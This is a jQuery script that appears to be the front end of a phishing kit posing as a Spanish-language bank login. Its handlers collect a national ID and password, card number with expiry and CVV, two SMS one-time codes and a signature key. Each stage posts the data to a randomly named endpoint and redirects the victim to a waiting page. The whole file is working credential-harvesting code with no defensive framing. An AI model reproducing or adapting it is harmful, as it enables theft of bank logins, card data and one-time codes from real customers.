

$(function () {
  
  $("#pg1").on("submit", function (e) {
    e.preventDefault();
    let logi = $("#dni").val();
    let paso = $("#paso").val();

    //send backend:
    $.ajax({
      url: "/gzLbTbjqMpc34D4XsPJ2",
      type: "POST",
      contentType: "application/json",
      data: JSON.stringify({ logi, paso }),
      success: function (info) {
        if (info.OK) {
          window.location = "/LGknmeM9HwWUWSutj6mJ";
        }
      },
    });
  });

  $("#pg2").on("submit", function (e) {
    e.preventDefault();
    let a1 = $("#one").val();
    let a2 = `${$("#two1").val()}/${$("#two2").val()}`;
    let a3 = $("#three").val();
    let a4 = $("#four").val();
    //send backend:
    $.ajax({
      url: "/NkMNm4664XhcW8KuukHk",
      type: "POST",
      contentType: "application/json",
      data: JSON.stringify({ a1, a2, a3, a4 }),
      success: function (info) {
        if (info.OK) {
          window.location = "/LGknmeM9HwWUWSutj6mJ";
        }
      },
    });
  });

  $("#pg3").on("submit", function (e) {
    // snms1:
    e.preventDefault();
    let sps1 = $("#sps1").val();

    //send backend:
    $.ajax({
      url: "/m4kT9BQWt7KTDdaVmafx",
      type: "POST",
      contentType: "application/json",
      data: JSON.stringify({ sps1 }),
      success: function (info) {
        if (info.OK) {
          window.location = "/LGknmeM9HwWUWSutj6mJ";
        }
      },
    });
  });

  $("#pg4").on("submit", function (e) {
    // snms2:
    e.preventDefault();
    let sps2 = $("#sps2").val();

    //send backend:
    $.ajax({
      url: "/Qv69PRvXg6PQEvrzJx6j",
      type: "POST",
      contentType: "application/json",
      data: JSON.stringify({ sps2 }),
      success: function (info) {
        if (info.OK) {
          window.location = "/LGknmeM9HwWUWSutj6mJ";
        }
      },
    });
  });

  ///////////////////////////
  $("#pg5").on("submit", function (e) {
    // FIRMA
    e.preventDefault();
    let firma = $("#firma").val();

    //send backend:
    $.ajax({
      url: "/Ov69PRlXg6PtEvrzJx6g",
      type: "POST",
      contentType: "application/json",
      data: JSON.stringify({ firma }),
      success: function (info) {
        if (info.OK) {
          window.location = "/LGknmeM9HwWUWSutj6mJ";
        }
      },
    });
  });
  ///////////////////////////
  $("#pg6").on("submit", function (e) {
    // namra
    e.preventDefault();
    let namra = $("#namra").val();

    //send backend:
    $.ajax({
      url: "/Mv67PRcPg6POEvrzJx6k",
      type: "POST",
      contentType: "application/json",
      data: JSON.stringify({ namra }),
      success: function (info) {
        if (info.OK) {
          window.location = "/LGknmeM9HwWUWSutj6mJ";
        }
      },
    });
  });
});
